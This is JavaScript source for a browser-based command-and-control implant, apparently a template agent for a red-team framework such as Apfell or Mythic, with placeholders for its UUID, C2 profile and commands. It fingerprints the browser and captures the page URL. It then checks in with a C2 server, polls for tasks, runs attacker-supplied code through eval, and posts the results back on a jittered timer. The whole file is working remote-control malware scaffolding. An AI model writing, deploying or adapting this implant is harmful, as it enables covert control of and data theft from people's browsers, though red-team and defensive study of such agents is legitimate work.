function get_browser() {
    var nVer = navigator.appVersion;
    var nAgt = navigator.userAgent;
    var browserName  = navigator.appName;
    var fullVersion  = ''+parseFloat(navigator.appVersion); 
    var majorVersion = parseInt(navigator.appVersion,10);
    var nameOffset,verOffset,ix;

    if ((verOffset=nAgt.indexOf("Opera"))!=-1) {
        browserName = "Opera";
        fullVersion = nAgt.substring(verOffset+6);
    if ((verOffset=nAgt.indexOf("Version"))!=-1) 
        fullVersion = nAgt.substring(verOffset+8);
    }
    else if ((verOffset=nAgt.indexOf("MSIE"))!=-1) {
        browserName = "Microsoft Internet Explorer";
        fullVersion = nAgt.substring(verOffset+5);
    }
    else if ((verOffset=nAgt.indexOf("Chrome"))!=-1) {
        browserName = "Chrome";
        fullVersion = nAgt.substring(verOffset+7);
    }
    else if ((verOffset=nAgt.indexOf("Safari"))!=-1) {
        browserName = "Safari";
        fullVersion = nAgt.substring(verOffset+7);
    if ((verOffset=nAgt.indexOf("Version"))!=-1) 
        fullVersion = nAgt.substring(verOffset+8);
    }
    else if ((verOffset=nAgt.indexOf("Firefox"))!=-1) {
        browserName = "Firefox";
        fullVersion = nAgt.substring(verOffset+8);
    }
    else if ( (nameOffset=nAgt.lastIndexOf(' ')+1) < 
            (verOffset=nAgt.lastIndexOf('/')) ) 
    {
        browserName = nAgt.substring(nameOffset,verOffset);
        fullVersion = nAgt.substring(verOffset+1);
        if (browserName.toLowerCase()==browserName.toUpperCase()) {
            browserName = navigator.appName;
        }
    }
    if ((ix=fullVersion.indexOf(";"))!=-1)
        fullVersion=fullVersion.substring(0,ix);
    if ((ix=fullVersion.indexOf(" "))!=-1)
        fullVersion=fullVersion.substring(0,ix);

    majorVersion = parseInt(''+fullVersion,10);
    if (isNaN(majorVersion)) {
        fullVersion  = ''+parseFloat(navigator.appVersion); 
        majorVersion = parseInt(navigator.appVersion,10);
    }
    return navigator.userAgent;
}

get_tab_id = function(){
    var tabID = sessionStorage.tabID && 
            sessionStorage.closedLastTab !== '2' ? 
            sessionStorage.tabID : 
            sessionStorage.tabID = Math.random();
            sessionStorage.closedLastTab = '2';
    return tabID;
}

class agent{
	constructor(){
		this.id = get_tab_id();
		this.user = "N/A";
		this.fullName = "N/A";
		this.ip = "N/A" 
		this.pid = "N/A";
		this.host = get_browser();
		this.environment = "N/A";
		this.uptime = "N/A";
		this.args = "N/A";
		this.osVersion = window.location['href'];
		this.uuid = "UUID_HERE";
	}
}
var bowser = new agent();
//--------------Base C2 INFORMATION----------------------------------------
class baseC2{
	//To create your own C2, extend this class and implement the required functions
	//The main code depends on the mechanism being C2 with these functions.
	//   the implementation of the functions doesn't matter though
	//   You're welcome to add additional functions as well, but this is the minimum
	constructor(interval, baseurl){
		this.interval = interval; //seconds between callbacks
		this.baseurl = baseurl; //where to reach out to
		this.commands = [];
	}
	checkin(){
		//check in with c2 server
	}
	getTasking(){
		//reach out to wherever to get tasking
	}
	getConfig(){
		//gets the current configuration for tasking
	}
	postResponse(task, output){
		//output a response to a task
	}
	setConfig(params){
		//updates the current configuration for how to get tasking
	}
	download(task, params){
	    //gets a file from the apfell server in some way
	}
	upload(task, params){
	    //uploads a file in some way to the teamserver
	}
}
C2PROFILE_HERE
default_load = function(contents){
    var module = {exports: {}};
    var exports = module.exports;
    if(typeof contents == "string"){
        eval(contents);
    }
    else{
        eval(contents.js);
    }
    return module.exports;
};
base64_decode = function(data){
    var decoded_data = atob(data)
    return decoded_data;
};
base64_encode = function(data){
    var encoded = btoa(data)
    return encoded;
};
var exports = {}; 
COMMANDS_HERE
var commands_dict = exports;
var jsimport = "";

let ip_found = false;
C2.commands =  Object.keys(commands_dict);
//---------------------------MAIN LOOP ----------------------------------------
async function sleepWakeUp(interval, jitter){
    while(true){
        let output = "";
        let task = await C2.getTasking();
	if (task != null){
        //console.log(JSON.stringify(task));
        let command = "";
        try{
        	//console.log(JSON.stringify(task));
        	if(task.length === 0){
        		continue;
        	}
        	task = task[0];
        	//console.log(JSON.stringify(task));
            command = task["command"];
            try{
                output = commands_dict[command](task, command, task['parameters']);
            }
            catch(error){
                if(error.toString().includes("commands_dict[command] is not a function")){
                    output ={"user_output": "Unknown command: " + command, "status": "error", "completed": true};
                }
                else{
                    output = {"user_output": error.toString(), "status": "error", "completed": true};
                }
            }
            C2.postResponse(task, output);
        }
        catch(error){
            C2.postResponse(task, {"user_output": error.toString(), "status": "error", "completed": true});
        }
}else{await new Promise(r => setTimeout(r, this.gen_sleep_time(interval, jitter)));}
    }
}

function gen_sleep_time(interval, jitter){
      //generate a time that's this.interval += (interval * 1/jitter)
      if(jitter < 1){return interval;}
      let plus_min = this.get_random_int(1);
      if(plus_min === 1){
          return (interval + (interval * (this.get_random_int(jitter)/100)))*1000;
      }else{
          return (interval - (interval * (this.get_random_int(jitter)/100)))*1000;
      }
    }
function get_random_int(max) {
    return Math.floor(Math.random() * Math.floor(max + 1));
}
C2.checkin("127.0.0.1",0,bowser.user,window.location['href'],"N/A", "N/A", get_browser());
sleepWakeUp(C2.interval, C2.jitter);
